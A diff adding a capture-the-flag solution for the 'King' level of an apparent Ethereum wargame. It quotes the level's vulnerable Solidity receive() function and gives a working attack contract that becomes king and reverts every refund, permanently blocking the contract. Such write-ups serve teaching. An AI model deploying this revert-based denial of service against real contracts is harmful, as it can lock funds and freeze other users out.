@@ -241,3 +241,35 @@ Tasks:
 
 - Such a fun game. Your goal is to break it.
 - When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.
+
+**Solution:** \
+Vulnerable Code:
+```
+  receive() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    king.transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+```
+
+Attack Payload:
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.5.17;
+
+contract Solution {
+    constructor() public payable {
+        // this address is the address of your level instance contract
+        address payable contractAddr = 0xDFE781807B2668D44BaB804e8cb5c4D685Ab2eff;
+        address(contractAddr).call.value(msg.value)("");
+    }
+    
+    function() external payable {
+        revert("lmao sucks");
+    }
+}
+```
+
+In the 3rd line of vulnerable function it's sending the ether to the previous king and than set highest ether sender user as king. In our attack contract when the vulnerable contract will try to send ether for setting new king. Our contract will revert that and other user will never be able to become king
+
